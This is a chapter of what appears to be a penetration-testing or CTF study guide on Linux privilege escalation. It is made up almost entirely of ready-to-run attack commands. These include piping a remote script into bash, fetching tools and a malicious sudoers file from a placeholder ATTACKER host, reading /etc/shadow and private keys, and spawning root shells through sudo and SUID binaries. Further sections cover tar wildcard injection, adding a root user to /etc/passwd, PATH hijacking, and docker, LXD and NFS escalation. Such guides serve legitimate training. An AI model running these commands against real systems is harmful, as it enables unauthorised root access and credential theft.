[◀ Prev: Initial Access](05-initial-access.md) · [🏠 Index](README.md) · [Next: Easy Machines ▶](07-easy-machines.md)

---

# 06 · Linux Privilege Escalation — Complete Methodology

## 6.1 Automated Enumeration — Run These First

```bash
# linpeas — most comprehensive Linux privesc enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | tee /tmp/linpeas_out.txt

# OR download and run
wget http://ATTACKER:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_out.txt

# pspy — monitor processes without root (great for cron jobs)
wget http://ATTACKER:8000/pspy64 -O /tmp/pspy
chmod +x /tmp/pspy
/tmp/pspy    # Let it run for 2-3 minutes to capture cron activity

# linux-exploit-suggester
wget http://ATTACKER:8000/linux-exploit-suggester.sh -O /tmp/les.sh
chmod +x /tmp/les.sh && /tmp/les.sh

# lse (linux smart enumeration)
wget http://ATTACKER:8000/lse.sh -O /tmp/lse.sh
chmod +x /tmp/lse.sh && /tmp/lse.sh -l 2
```

## 6.2 Manual Enumeration Checklist — Always Run

```bash
# ── IDENTITY & CONTEXT ────────────────────────────────────────────────
id                             # Current user, groups
whoami && hostname && uname -a
cat /etc/os-release

# ── SUDO RIGHTS ───────────────────────────────────────────────────────
sudo -l                        # Most important check
# Look for: NOPASSWD entries, unrestricted commands

# ── SUID BINARIES ─────────────────────────────────────────────────────
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# ── SGID BINARIES ─────────────────────────────────────────────────────
find / -perm -g=s -type f 2>/dev/null

# ── CAPABILITIES ──────────────────────────────────────────────────────
getcap -r / 2>/dev/null

# ── CRON JOBS ─────────────────────────────────────────────────────────
cat /etc/crontab
ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null
crontab -l 2>/dev/null

# ── WRITABLE FILES ────────────────────────────────────────────────────
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
find / -writable -type d 2>/dev/null | grep -v proc

# ── SENSITIVE FILES ───────────────────────────────────────────────────
cat /etc/passwd
cat /etc/shadow 2>/dev/null    # Only if root or group shadow
cat /etc/sudoers 2>/dev/null
find / -name '*.bak' -o -name '*.old' -o -name '*.conf' 2>/dev/null | head -30
find / -name 'id_rsa' -o -name '*.key' -o -name '*.pem' 2>/dev/null

# ── NETWORK ───────────────────────────────────────────────────────────
ip addr && ip route
netstat -tulpn 2>/dev/null || ss -tulpn
cat /etc/hosts

# ── PROCESSES ─────────────────────────────────────────────────────────
ps aux
ps aux | grep root
```

## 6.3 Sudo Abuse — GTFOBins

> **GTFOBins** (gtfobins.github.io) documents how to escalate via every binary that sudo allows. Always check it for any binary listed in `sudo -l`.

| Binary | Sudo Command | Escalation |
| --- | --- | --- |
| vim | `sudo vim /file` | `sudo vim -c ':!/bin/bash'` |
| python | `sudo python3 x.py` | `sudo python3 -c 'import os; os.system("/bin/bash")'` |
| find | `sudo find` | `sudo find . -exec /bin/sh \; -quit` |
| awk | `sudo awk` | `sudo awk 'BEGIN {system("/bin/bash")}'` |
| less | `sudo less /file` | `sudo less /etc/passwd` → `!/bin/bash` |
| man | `sudo man man` | `sudo man man` → `!/bin/bash` |
| nano | `sudo nano` | `sudo nano` → `Ctrl+R Ctrl+X` then: `reset; bash 1>&0 2>&0` |
| bash | `sudo bash` | `sudo bash` → instant root |
| env | `sudo env` | `sudo env /bin/bash` |
| perl | `sudo perl` | `sudo perl -e 'exec "/bin/bash"'` |
| ruby | `sudo ruby` | `sudo ruby -e 'exec "/bin/bash"'` |
| lua | `sudo lua` | `sudo lua -e 'os.execute("/bin/bash")'` |
| tee | `sudo tee` | `echo 'user ALL=(ALL) NOPASSWD:ALL' \| sudo tee -a /etc/sudoers` |
| wget | `sudo wget` | `sudo wget -O /etc/sudoers http://ATTACKER/malicious_sudoers` |
| tar | `sudo tar` | `sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` |
| zip | `sudo zip` | `sudo zip /tmp/test.zip /tmp/test -T --unzip-command='sh -c /bin/bash'` |
| nmap | `sudo nmap` | `echo 'os.execute("/bin/bash")' > /tmp/nmap.nse; sudo nmap --script=/tmp/nmap.nse` |
| cp | `sudo cp` | `sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash; /tmp/rootbash -p` |

## 6.4 SUID Binary Abuse

```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Check each binary on GTFOBins -> SUID section
# https://gtfobins.github.io/#+suid

# Common SUID escalations:

# /usr/bin/find
find . -exec /bin/sh -p \; -quit

# /usr/bin/python3
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# /usr/bin/vim
vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; exec bash -p")'

# Custom SUID binary — check with strings and ltrace
strings /path/to/suid_binary       # Look for system() calls, hardcoded paths
ltrace /path/to/suid_binary 2>&1
strace /path/to/suid_binary 2>&1 | grep exec
```

## 6.5 Cron Job Exploitation

```bash
# Monitor running cron jobs with pspy
/tmp/pspy64
# Watch for scripts run by root (UID=0)

# Check writable scripts called by root cron
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/

# If a cron calls a script you can write to:
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
# Wait for cron, then:
/bin/bash -p

# Wildcard injection in cron tar command
# If cron runs: tar cf /tmp/backup.tar /home/user/*
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh privesc.sh'
cat > privesc.sh << 'EOF'
chmod +s /bin/bash
EOF
# When tar runs, it interprets these filenames as options
```

## 6.6 Linux Capabilities Abuse

```bash
# Find binaries with elevated capabilities
getcap -r / 2>/dev/null

# Dangerous capabilities:
#   cap_setuid+ep    -> set UID to 0
#   cap_net_raw+ep   -> raw sockets (sniff, forge)
#   cap_sys_admin    -> almost root
#   cap_dac_override -> bypass file permissions

# cap_setuid exploitation examples:

# python3 with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl with cap_setuid
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash"'

# ruby with cap_setuid
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# vim with cap_setuid
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash","bash","-c","reset; exec bash")'

# node with cap_setuid
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'
```

## 6.7 Writable /etc/passwd or /etc/shadow

```bash
# Check writability
ls -la /etc/passwd /etc/shadow

# If /etc/passwd is writable — add root user
openssl passwd -1 -salt xyz password123
# Generate hash, then:
echo 'pwned:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned    # Enter: password123

# Alternative — remove x from root (disables password)
sed -i 's/root:x:/root::/' /etc/passwd
su root

# If /etc/shadow is writable — change root password
mkpasswd -m sha-512 newpassword
# Replace root's hash in /etc/shadow
```

## 6.8 PATH Hijacking

```bash
# A SUID/sudo binary calls a command without full path
# Example: system('ps') instead of system('/bin/ps')

# Step 1: Identify the binary calling relative commands
strings /path/to/suid_binary | grep -v '/' | grep -v '\.'
strace /path/to/suid_binary 2>&1 | grep exec

# Step 2: Check PATH
echo $PATH

# Step 3: Create malicious binary in writable PATH location
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/ps
echo 'chmod +s /bin/bash' >> /tmp/ps
chmod +x /tmp/ps

# Step 4: Run the SUID binary
/path/to/suid_binary
/bin/bash -p
```

## 6.9 Docker / LXD / LXC Group Membership

```bash
# Check group memberships
id

# If docker group:
# Docker — mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -i -n -p -- bash

# LXD escalation (if lxd group member)
# Step 1: Build alpine image on attacker
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && sudo ./build-alpine
# Transfer alpine image to target

# Step 2: On target
lxc image import ./alpine-*.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
# Now in container with host fs at /mnt/root
cat /mnt/root/etc/shadow
chmod +s /mnt/root/bin/bash
```

## 6.10 NFS no_root_squash

```bash
# Check NFS exports on target
cat /etc/exports
# Look for: no_root_squash option

# Mount from attacker (as root)
showmount -e $TARGET
sudo mount -t nfs $TARGET:/shared /tmp/nfsmount -o nolock

# Create SUID bash binary on mounted share
sudo cp /bin/bash /tmp/nfsmount/
sudo chmod +s /tmp/nfsmount/bash

# On target, execute the SUID bash
ls -la /shared/bash
/shared/bash -p
whoami    # should be root
```

---

[◀ Prev: Initial Access](05-initial-access.md) · [🏠 Index](README.md) · [Next: Easy Machines ▶](07-easy-machines.md)
